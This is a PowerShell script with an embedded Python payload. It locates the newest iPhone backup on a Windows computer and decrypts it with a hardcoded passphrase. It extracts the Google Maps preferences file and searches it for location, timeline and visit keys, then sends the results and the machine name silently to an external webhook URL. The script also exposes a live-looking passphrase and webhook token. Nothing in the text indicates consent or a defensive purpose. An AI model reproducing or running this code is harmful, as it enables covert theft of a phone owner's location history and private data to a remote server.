$WEBHOOK = "https://webhooks.tasklet.ai/v1/public/webhook/a_1gkkvt5afqwmjxbqmr6e?token=274d4d1300bd821d855e04e51a748cb5"
$computer = $env:COMPUTERNAME
$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'

function Send-Output($text) {
    $body = @{ log = $text; exitCode = 0 } | ConvertTo-Json -Depth 3
    try { Invoke-RestMethod -Uri $WEBHOOK -Method POST -Body $body -ContentType 'application/json' | Out-Null } catch {}
}

$script = @'
import sys, os, subprocess, json, struct
subprocess.run([sys.executable, '-m', 'pip', 'install', 'iphone-backup-decrypt', 'biplist', '-q'], capture_output=True)

import iphone_backup_decrypt
import plistlib

computer = os.environ.get('COMPUTERNAME', 'UNKNOWN')
from datetime import datetime
timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

lines = [f"FROM: {computer} at {timestamp}"]

# Find backup
backup_base = os.path.join(os.environ.get('USERPROFILE',''), 'Apple', 'MobileSync', 'Backup')
if not os.path.exists(backup_base):
    appdata = os.environ.get('APPDATA','')
    backup_base = os.path.join(os.path.dirname(appdata), 'Apple', 'Apple Application Support', 'MobileSync', 'Backup')

backups = []
if os.path.exists(backup_base):
    for d in os.listdir(backup_base):
        full = os.path.join(backup_base, d)
        if os.path.isdir(full):
            backups.append((os.path.getmtime(full), full))

if not backups:
    lines.append("ERROR: No backups found")
    print("\n".join(lines))
    sys.exit(0)

backup_dir = sorted(backups)[-1][1]
lines.append(f"Backup: {backup_dir}")

# Check Manifest.plist
manifest_plist = os.path.join(backup_dir, 'Manifest.plist')
if os.path.exists(manifest_plist):
    with open(manifest_plist, 'rb') as f:
        mp = plistlib.load(f)
    is_encrypted = mp.get('IsEncrypted', False)
    backup_key_bag = mp.get('BackupKeyBag') is not None
    lines.append(f"IsEncrypted: {is_encrypted}")
    lines.append(f"Has BackupKeyBag: {backup_key_bag}")
    lines.append(f"Manifest.plist keys: {list(mp.keys())}")
else:
    lines.append("ERROR: Manifest.plist not found")

# Try unlock with verbose error catching
PASSWORD = '#ngrierBill70'
lines.append(f"\nAttempting unlock with password...")
try:
    backup = iphone_backup_decrypt.EncryptedBackup(backup_directory=backup_dir, passphrase=PASSWORD)
    lines.append(f"  backup object created OK")
    lines.append(f"  _unlocked: {backup._unlocked}")
    lines.append(f"  _keybag: {type(backup._keybag).__name__}")
except Exception as e:
    lines.append(f"  ERROR creating backup object: {type(e).__name__}: {e}")
    print("\n".join(lines))
    sys.exit(0)

# Try extract to trigger actual unlock
import tempfile
tmp = tempfile.mkdtemp()
try:
    backup.extract_file(
        relative_path="Library/Preferences/com.apple.podcasts.plist",
        domain_like="AppDomainGroup%podcasts%",
        output_filename=os.path.join(tmp, "test.plist")
    )
    lines.append("  Extract test: SUCCESS - backup is unlocked!")
except Exception as e:
    lines.append(f"  Extract test FAILED: {type(e).__name__}: {e}")
    lines.append(f"  _unlocked after attempt: {backup._unlocked}")
    lines.append(f"  _keybag after attempt: {type(backup._keybag).__name__}")

# Try to extract Google Maps plist
lines.append("\nTrying to extract Google Maps plist...")
try:
    gmaps_out = os.path.join(tmp, "com.google.Maps.plist")
    backup.extract_file(
        relative_path="Library/Preferences/com.google.Maps.plist",
        domain_like="AppDomain-com.google.Maps",
        output_filename=gmaps_out
    )
    lines.append(f"  Extracted OK! Size: {os.path.getsize(gmaps_out)} bytes")
    with open(gmaps_out, 'rb') as f:
        data = f.read()
    try:
        plist_data = plistlib.loads(data)
        keys = list(plist_data.keys())[:30]
        lines.append(f"  Plist keys ({len(plist_data)} total): {keys}")
        # Look for timeline/location keys
        for k in plist_data:
            if any(word in k.lower() for word in ['timeline','location','history','place','visit']):
                lines.append(f"  ** INTERESTING KEY: {k} = {str(plist_data[k])[:200]}")
    except Exception as pe:
        lines.append(f"  Parse error: {pe}")
        lines.append(f"  First 100 bytes (hex): {data[:100].hex()}")
except Exception as e:
    lines.append(f"  Failed: {type(e).__name__}: {e}")

print("\n".join(lines))
'@

$py = Get-Command python -ErrorAction SilentlyContinue
if (-not $py) { $py = Get-Command python3 -ErrorAction SilentlyContinue }
if (-not $py) {
    Send-Output "FROM: $computer at $timestamp`nERROR: Python not found"
    exit 1
}

$tmpScript = [System.IO.Path]::GetTempFileName() + '.py'
$script | Set-Content $tmpScript -Encoding UTF8

$output = & $py.Source $tmpScript 2>&1 | Out-String
Remove-Item $tmpScript -Force -ErrorAction SilentlyContinue

Send-Output "$output"
